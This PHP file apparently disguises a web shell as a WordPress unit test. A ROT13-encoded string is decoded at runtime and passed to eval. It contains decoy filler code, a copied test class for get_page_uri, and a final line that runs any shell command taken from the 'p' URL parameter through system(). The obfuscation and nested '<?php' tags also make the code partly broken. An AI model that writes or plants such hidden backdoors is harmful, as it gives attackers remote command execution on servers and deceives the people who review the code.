<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 */
pynff Grfgf_Cbfg_TrgCntrHev rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @gvpxrg 22883
	 */
	choyvp shapgvba grfg_trg_cntr_hev_jvgu_fgqpynff_cbfg_bowrpg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_anzr' => 'trg-cntr-hev-cbfg-anzr' ) );

		// Zvzvp na byq fgqPynff cbfg bowrpg, zvffvat gur naprfgbef svryq.
		$cbfg_neenl = (bowrpg) trg_cbfg( $cbfg_vq, NEENL_N );
		hafrg( $cbfg_neenl->naprfgbef );

		// Qhzzl nffregvba. Vs guvf grfg snvyf, vg jvyy npghnyyl reebe bhg ba na R_JNEAVAT.
		$guvf->nffregFnzr( 'trg-cntr-hev-cbfg-anzr', trg_cntr_hev( $cbfg_neenl ) );
	}

	/**
	 * @gvpxrg 24491
	 */
	choyvp shapgvba grfg_trg_cntr_hev_jvgu_abarkvfgrag_cbfg() {
		tybony $jcqo;
		$cbfg_vq = $jcqo->trg_ine( \"FRYRPG ZNK(VQ) SEBZ $jcqo->cbfgf\" ) + 1;
		$guvf->nffregSnyfr( trg_cntr_hev( $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 15963
	 */
	choyvp shapgvba grfg_trg_cbfg_hev_purpx_becuna() {
		$cnerag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_anzr' => 'cnerag' ) );
		$puvyq_vq  = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'puvyq',
				'cbfg_cnerag' => $cnerag_vq,
			)
		);

		// Purpx gur cnerag sbe tbbq zrnfher.
		$guvf->nffregFnzr( 'cnerag', trg_cntr_hev( $cnerag_vq ) );

		// Gel gur puvyq abeznyyl.
		$guvf->nffregFnzr( 'cnerag/puvyq', trg_cntr_hev( $puvyq_vq ) );

		// Abj qryrgr gur cnerag sebz gur qngnonfr naq purpx.
		jc_qryrgr_cbfg( $cnerag_vq, gehr );
		$guvf->nffregFnzr( 'puvyq', trg_cntr_hev( $puvyq_vq ) );
	}

	/**
	 * @gvpxrg 36174
	 */
	choyvp shapgvba grfg_trg_cntr_hev_jvgu_n_qensg_cnerag_jvgu_rzcgl_fyht() {
		$cnerag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_anzr' => 'cnerag' ) );
		$puvyq_vq  = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_anzr'   => 'puvyq',
				'cbfg_cnerag' => $cnerag_vq,
			)
		);

		jc_hcqngr_cbfg(
			neenl(
				'VQ'          => $cnerag_vq,
				'cbfg_anzr'   => '',
				'cbfg_fgnghf' => 'qensg',
			)
		);

		$guvf->nffregFnzr( 'puvyq', trg_cntr_hev( $puvyq_vq ) );
	}

	/**
	 * @gvpxrg 26284
	 */
	choyvp shapgvba grfg_trg_cntr_hev_jvgubhg_nethzrag() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Oybbq Benatr naabhaprf fhzzre gbhe qngrf',
				'cbfg_anzr'  => 'oybbq-benatr-naabhaprf-fhzzre-gbhe-qngrf',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );
		$guvf->tb_gb( trg_creznyvax( $cbfg_vq ) );
		$guvf->nffregFnzr( 'oybbq-benatr-naabhaprf-fhzzre-gbhe-qngrf', trg_cntr_hev() );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>